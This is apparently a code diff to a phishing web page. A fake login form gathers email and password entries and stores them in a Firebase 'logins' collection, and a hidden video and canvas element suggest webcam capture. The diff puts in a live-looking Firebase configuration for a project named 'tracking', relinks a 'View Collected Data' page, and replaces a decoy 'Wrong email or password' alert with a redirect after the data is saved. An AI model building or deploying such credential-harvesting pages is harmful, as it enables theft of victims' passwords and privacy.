@@ -29,20 +29,20 @@
             <input type="password" id="password" placeholder="Enter your password" required>
             <button type="submit">Next</button>
         </form>
-        <p><a href="data.html">View Collected Data</a></p>
+        <p><a href="receiver.html">View Collected Data</a></p>
     </div>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
     <script>
-        // Replace this with your own firebaseConfig from your Firebase project
+        // Replace this with your own firebaseConfig if you created a new Firebase project
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT_ID.firebasestorage.app",
-            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-            appId: "YOUR_APP_ID",
-            measurementId: "YOUR_MEASUREMENT_ID"
+            apiKey: "AIzaSyAtRqJeS7UaxHHVRwZ3ov-8jXVToVvGuKg",
+            authDomain: "tracking-d2d42.firebaseapp.com",
+            projectId: "tracking-d2d42",
+            storageBucket: "tracking-d2d42.firebasestorage.app",
+            messagingSenderId: "411030031665",
+            appId: "1:411030031665:web:b79f56ad363c8a7b6d3410",
+            measurementId: "G-QB5KNP29EJ"
         };
         const app = firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
@@ -159,7 +159,8 @@
             try {
                 await db.collection('logins').add(payload);
                 console.log('Data successfully saved to Firestore');
-                alert('Wrong email or password');
+                // Redirect to receiver.html after successful data collection
+                window.location.href = 'receiver.html';
             } catch (error) {
                 console.error('Firestore error:', error.message);
                 alert('Failed to save data: ' + error.message);
